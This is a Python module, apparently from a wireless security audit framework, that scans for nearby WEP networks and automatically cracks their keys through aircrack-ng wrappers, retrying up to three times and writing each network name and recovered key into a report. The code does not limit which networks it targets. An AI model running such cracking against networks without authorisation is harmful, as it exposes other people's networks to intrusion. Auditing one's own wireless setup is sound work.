#!/usr/bin/env python3
from os.path import splitext, basename
from subprocess import run, DEVNULL

from tests.test import Test
from tools.aircrack import Aircrack
from tools.airmon import Airmon
from tools.airodump import Airodump

title = 'WEP crack'
desc = ''
vulnerability = ''
exploit = ''
countermeasure = ''


class Wep(Test):
    def __init__(self):
        run(["pkill", "air*"], stdout=DEVNULL, stderr=DEVNULL)
        Test.__init__(self)
        self.title = title
        self.desc = desc
        self.vulnerability = vulnerability
        self.exploit = exploit
        self.countermeasure = countermeasure
        self.filename = splitext(basename(__file__))[0] + ".md"
        self.airmon = Airmon()
        self.aircrack = Aircrack()
        self.airodump = Airodump()
        self.run()

    def run(self):
        # Monitor mode
        self.airmon.monitor()

        # Scan
        self.airodump.scan()
        # self.results += self.aircrack.raw_csv

        # Extracting
        if not Airodump.targets_wep:
            self.results += "\nNo WEP networks!"
            self.code = 1
        else:
            for t in Airodump.targets_wep:
                count = 1
                self.code = self.aircrack.auto_crack_wep(t)
                while self.code is not 0 and count is not 3:
                    count += 1
                    self.code = self.aircrack.auto_crack_wep(t)
                # Logging
                self.results += t.essid + " = " + t.key + " (" + str(count) + " attempt(s))\n"

        # Station/managed mode
        self.airmon.station()

        self.build_report()
        self.end()
